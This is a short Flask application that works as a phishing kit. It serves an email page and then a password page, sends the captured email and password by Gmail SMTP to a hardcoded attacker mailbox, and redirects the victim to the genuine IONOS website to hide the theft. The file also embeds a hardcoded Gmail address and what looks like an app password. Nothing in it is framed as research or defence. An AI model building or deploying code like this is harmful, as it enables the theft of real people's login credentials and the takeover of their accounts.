from flask import Flask, render_template, request, redirect, url_for
from flask_mail import Mail, Message

app = Flask(__name__)

app.secret_key = 'your_secret_key'  # Replace with your secret key

# Flask-Mail configuration for Gmail
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'smartdevtechemail@gmail.com'  # Your Gmail address
app.config['MAIL_PASSWORD'] = 'yjhiusdfetotjrzp'   # Your Gmail password or app-specific password

mail = Mail(app)

@app.route('/')
def index():
    return render_template('email.html', email='')

@app.route('/capture_email', methods=['POST'])
def capture_email():
    if request.method == 'POST':
        email = request.form.get('email')
        return render_template('password.html', email=email)

@app.route('/capture_password', methods=['POST'])
def capture_password():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        # Send email using Flask-Mail
        recipient = 'smartdevtechemail@gmail.com'  # Your email address to receive the email
        subject = 'Login'
        body =body = f'Email: {email}\nPassword entered: {password}'

        msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[recipient])
        msg.body = body

        try:
            mail.send(msg)
            return redirect('https://www.ionos.de/')
        except Exception as e:
            return str(e)

if __name__ == '__main__':
    app.run(debug=True)
